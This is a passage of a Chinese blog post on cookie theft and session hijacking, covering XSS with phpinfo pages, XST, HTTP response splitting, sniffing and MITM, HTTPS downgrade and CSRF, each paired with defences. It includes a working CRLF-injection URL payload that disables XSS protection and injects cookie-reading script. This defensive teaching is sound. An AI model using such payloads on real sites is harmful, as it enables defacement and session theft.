0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">document.cookie</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">获取到，可以转而通过其他的方式。下面介绍两种xss结合其他漏洞的攻击方式。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">xss结合phpinfo页面</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">攻击</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">大家都知道，利用php开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括cookie信息。 如果开发者没有关闭这个页面，就可以利用xss漏洞向这个页面发起异步请求，获取到页面内容后parse出cookie信息，然后上传给攻击者。 phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">关闭所有phpinfo类dump request信息的页面。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">XSS + HTTP TRACE = XST</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">这是一种古老的攻击方式，现在已经消失，写在这里可以扩展一下攻防思路。http trace是让我们的web服务器将客户端的所有请求信息返回给客户端的方法。其中包含了HttpOnly的cookie。如果利用xss异步发起trace请求，又可以获取session信息了。之所以说是一种古老的攻击方式，因为现代浏览器考虑到XST的危害都禁止了异步发起trace请求。另外提一点，当浏览器没有禁止异步发起trace的时代，很多开发者都关闭了web server的trace支持来防御XST攻击。但攻击者在特定的情况下还可以绕过，用户使用了代理服务器，而代理服务器没有关闭trace支持，这样又可以trace了。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">HTTP Response Splitting</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。例如，一个站点接受参数做302跳转：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">www.example.com/?r=http://baidu.com</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">request信息：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">GET /example.com?r=http://baidu.com\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Host: example.com\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">\r\n</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">response:</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 302 Found\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Location: http://baidu.com\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-Type: text/html\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">\r\n</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">这样页面就302跳转到百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">\r\n</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">的header信息：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3E</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">response变成了：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 302 Found\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Location: \r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 200 OK\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-Type: text/html\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">X-XSS-Protection: 0\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-Type: text/html\r\n</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">\r\n</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">有两个攻击要点：</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">指定X=XSS-Protection: 0 ，关闭浏览器的xss保护机制。</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">注入脚本</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">针对header的内容做过滤，不能漏掉</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">\r\n</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，特别是Location，host，referrer等。说到底，这也是一种XSS攻击，只是攻击方式与普通的不太一样。针对header的攻击还可以做SQL注入等，防御的原则是对所有的输入进行sanitize，包括非用户输入的内容，比如referrer这种一般由浏览器带过来的信息，因为请求完全可以被伪造，未必来自浏览器。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">网络监听(network eavesdropping/network sniffing)</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">以上是利用上层应用的特性的几种攻击方式，cookie不仅存在于上层应用中，更流转于请求中。上层应用获取不到后，攻击者可以转而从网络请求中获取。只要是未使用https加密的网站都可以抓包分析，其中就包含了标识session的cookie。当然，完成网络监听需要满足一定的条件，这又是另外一个话题了。常见的方式：</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">DNS缓存投毒攻击者把要攻击的域名的一个子域映射到攻击者的server，然后想办法让被攻击者访问这个server(XSS request、社会化攻击等)，请求中会带过来所有cookie（包括HttpOnly）。</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">中间人攻击常见的攻击方式是搭建免费wifi，把DHCP服务器指定为攻击者ip，在攻击者机器上可以收到所有请求，不仅可以获取cookie，还可以进行脚本注入。</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">使用https。使用https协议的请求都被ssl加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。防御网络监听通常有两种方式：</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">信道加密</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">内容加密</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">https是加密信道，在此信道上传输的内容对中间人都是不可见的。但https是有成本的。内容加密比较好理解，例如对password先加密再传输。但是对于标识session的cookie这种标识性信息是无法通过内容加密得到保护的。那么，使用https的站点就可以高枕无忧了吗？事实上，一些细节上的处理不当同样会暴露出攻击风险。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">https站点攻击：双协议</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如果同时支持http和https，那么还是可以使用网络监听http请求获取cookie。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">只支持https，不支持http。这样就好了吗？No.</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">https站点攻击：301重定向</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">例如www.example.com只支持https协议，当用户直接输入example.com（大部分用户都不会手动输入协议前缀），web server通常的处理是返回301要求浏览器重定向到</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">https://www.example.com</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">。这次301请求是http的！而且带了cookie，这样又将cookie明文暴露在网络上了。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御1</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">把标识session的cookie设置成secure。上面提到的secure cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。 然后现实很残酷，很多站点根本无法做到所有的请求都走https。原因有很多，可能是成本考虑，可能是业务需求。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御2</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">设置</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">Strict-Transport-Security header</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。更多</span><a href="https://www.owasp.org/index.php/HTTP_Strict_Transport_Security" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">点此</a> <a href="http://www.wooyun.org/bugs/wooyun-2010-049877/auth/36b625b1c47b40b270c6a390a0fb9525" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">乌云案例</a></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">思考</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如果偷取cookie失败，无法session劫持，攻击者如何再发起攻击？劫持session的目的是拿到登录态，从而获得服务器授权做很多请求，例如账户变更。如果劫持不到session，也能够做授权请求不是也达到攻击的目的了？无需拿到session cookie，跨站发起请求就可以了，这就是CSRF！server通过把用户凭证存储在cookie以维持session，http/https协议每次访问都会自动传输cookie，协议上的缺陷是导致可进行CSRF攻击的根本原因！防御方式：使用anti-forgery token</span></div><blockquote style="font-size: inherit; margin: 0px 0px 1.5em 2em; padding: 0px 0px 0px 1em; border-width: 0px 0px 0px 5px; border-style: none none none solid; border-color: initial; border-image: initial; vertical-align: baseline; quotes: none;"><div style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-style: italic;">大部分攻击都是提权行为，最基本的提权通过偷取用户名密码，不成功转而窃取session，窃取不成转而跨站攻击，实在不行重放也可以造成危害</span></div></blockquote><div style="font-size: inherit; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">原文地址：</span><a href="http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html</a></div><div style="font-size: inherit; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><br></div></div></div></div></div></div></div></div></div></div></div><div><br></div></div></body></html>
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+            
+        
+            
+            
+                
+            
+        
+            
+            
+                
+            
+        
+            
+            
+        
+            
+            
+        
+            
+            
+        
+            
+            
+        
+            
+            
+        
+            
+            
+                
+            
+        
+            
+            
+        
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/">Session劫持原理，技术实现与防范_Web开发</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2020/07/07/%E6%B5%85%E8%B0%88CSRF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-hyddd-%E5%8D%9A%E5%AE%A2%E5%9B%AD/">浅谈CSRF攻击方式-hyddd-博客园</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'https://tldsn.github.io/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'https://tldsn.github.io/2020/07/07/cookie%E7%AA%83%E5%8F%96%E5%92%8Csession%E5%8A%AB%E6%8C%81-WEB%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//https-tldsn-github-io.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/assets/js/pageContent.js " charset="utf-8"></script>
+
+
+  <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+            
+        </p>
+        <p class="contact">
+            Contact me at: 
+            <a href="https://github.com/tldsn" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=742720531@qq.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>  
+            <a href="http://weibo.com/5578237033" title="Weibo"><i class="fa fa-weibo" aria-hidden="true"></i></a>  
+            <a href="https://www.zhihu.com/people/yao-yu-jie-90" title="Zhihu"><i class="iconfont blog-zhihu"></i></a>  
+            <a href="https://www.douban.com/people/122400251" title="Douban"><i class="iconfont blog-douban"></i></a>  
+            <a href="https://music.163.com/#/user/home?id=263386850" title="Cloudmusic"><i class="iconfont blog-yinle"></i></a>  
+             
+               
+            
+        </p>
+        <p class="busuanzi">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://pages.github.com/">Github Pages</a>.
+            </span>
+            <span>
+                Theme designed by <a href="https://github.com/Gaohaoyang">HyG</a>.
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+  <div id="music"></div>
+
+  <!-- 加载 cplayer 脚本 -->
+  <!-- <script src="https://cdn.jsdelivr.net/npm/cplayer/dist/cplayer.min.js"></script>
+  <script>
+    let player = new cplayer({
+      element: document.getElementById('music'),
+      playlist: [
+      ]
+    })
+
+    cplayer.prototype.add163 = function add163(id) {
+      if (!id) throw new Error("Unable Property.");
+      return fetch("https://music.huaji8.top/?id=" + id).then(function (res) { return res.json() }).then(function (data) {
+        let obj = {
+          name: data.info.songs[0].name,
+          artist: data.info.songs[0].ar.map(function (ar) { return ar.name }).join(','),
+          poster: data.pic.url,
+          lyric: data.lyric.lyric,
+          sublyric: data.lyric.tlyric,
+          src: data.url.url,
+          album: data.info.songs[0].al.name
+        }
+        this.add(obj);
+        return obj;
+      }.bind(this))
+    }
+    player.add163(263386850)
+  </script> -->
+  <script src=" /assets/js/main.js " charset="utf-8"></script>
+  <script src=" /assets/js/smooth-scroll.min.js " charset="utf-8"></script>
+  <script type="text/javascript">
+    smoothScroll.init({
+      speed: 500, // Integer. How fast to complete the scroll in milliseconds
+      easing: 'easeInOutCubic', // Easing pattern to use
+      offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+    });
+  </script>
+  <!-- <script src=" /assets/js/scroll.min.js " charset="utf-8"></script> -->
+</body>
+
+</html>
